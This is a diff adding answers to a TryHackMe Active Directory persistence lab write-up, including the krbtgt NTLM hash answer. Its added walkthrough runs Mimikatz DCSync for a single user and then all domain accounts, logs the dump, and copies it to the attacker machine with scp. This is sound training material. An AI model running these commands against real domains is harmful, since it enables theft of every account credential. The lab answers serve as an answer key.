@@ -151,8 +151,74 @@ This will take a bit of time to complete. Once done, exit Mimikatz to finalise t
 ### Answer the questions below
 
 * What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?
+	
+	`lsadump::dcsync /domain:za.tryhackme.loc /user:test`
 
 * What is the NTLM hash associated with the krbtgt user?
+
+	`16f9af38fca3ada405386b3b57366082`
+
+	* Get the credential
+	
+		![task2-credential](./images/task2-credential.png)
+
+	* Login SSH to THMWRK1
+	
+		```
+		ssh administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc
+		```
+
+		![task2-ssh](./images/task2-ssh.png)
+
+	* Run mimikatz
+	
+		```
+		C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+		```
+
+		![task2-mimikatz](./images/task2-mimikatz.png)
+
+	* Performing a DC Sync of a single account
+	
+		```
+		lsadump::dcsync /domain:za.tryhackme.loc /user:lorraine.gill
+		```
+
+		![task2-lsadump](./images/task2-lsadump.png)
+
+	* Set Log file
+	
+		```
+		log lorraine.gill_dcdump.txt
+		```
+
+		![task2-log](./images/task2-log.png)
+
+	* DC Sync all account
+	
+		```
+		lsadump::dcsync /domain:za.tryhackme.loc /all
+		```
+
+		![task2-dcsync](./images/task2-dcsync.png)
+
+	* Download dcsync log to attacker machine
+	
+		```
+		scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/lorraine.gill_dcdump.txt .
+		```
+
+		![task2-download](./images/task2-download.png)
+
+	* Open file log and search SAM Username : krbtgt
+	
+		```
+		less lorraine.gill_dcdump.txt
+
+		# search with hitting key "/" and type "krbtgt"
+		```
+
+		![task2-krbtgt](./images/task2-krbtgt.png)
 
 ## Task 3 - Persistence through Tickets
 
